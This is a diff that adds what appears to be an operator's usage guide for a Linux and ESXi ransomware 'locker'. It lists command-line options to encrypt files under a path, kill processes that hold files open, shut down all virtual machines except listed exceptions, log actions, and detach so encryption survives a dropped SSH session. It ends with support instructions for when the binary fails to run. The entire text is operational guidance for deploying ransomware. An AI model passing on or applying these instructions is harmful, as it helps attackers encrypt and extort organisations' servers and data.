@@ -1,0 +1,31 @@
+@all parameter for launching the locker on linux versions
+Unix version launch parameters
+--path
+     When using this parameter, the locker will encrypt files in the specified path. A required parameter will not lock anything without it.
+     ./encryptor --path /path
+     
+--prockiller
+     Kills all processes that interfere with the opening of files.
+     ./encryptor --path /path --prockiller
+     
+--log
+     Includes logging of all actions and errors
+     ./encryptor --path /path --log /root/log.txt
+
+--vmkiller (esxi only)
+     Shuts down all virtual machines
+     
+--vmlist (esxi only)
+     Specifies a file with a list of virtual machines that should not be shut down. One line for each vm
+     ./encryptor --path /path --vmkiller --vmlist /tmp/list.txt
+
+--detach
+      Detaches the process from the terminal.
+So that if the ssh session falls off, the locker will continue to work
+And the files are not beaten
+
+ESXi version REQUEST SEPARATELY
+
+
+If somewhere it does not start, I need an OS, a kernel version and a glibc version
+/lib64/libc.so.6
